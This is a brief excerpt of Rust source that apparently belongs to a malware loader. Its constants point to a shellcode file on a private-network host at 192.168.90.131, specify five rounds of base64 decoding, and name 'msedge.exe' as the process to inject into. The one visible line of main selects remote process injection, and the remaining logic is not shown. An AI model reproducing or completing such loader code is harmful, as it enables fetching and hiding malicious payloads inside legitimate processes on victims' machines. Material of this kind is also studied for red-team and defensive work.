...
const URL: &str = "http://192.168.90.131:8081/apollo_shell_rusty.txt";
/// The # of base64 iterations to decode
const B64_ITERATIONS: usize = 5;
/// If not blank, the process name to inject into
const PROCESS_NAME: &str = "msedge.exe";
...
fn main() -> Result<(), String> {
    let injection_type = InjectionType::Remote(PROCESS_NAME.to_string());
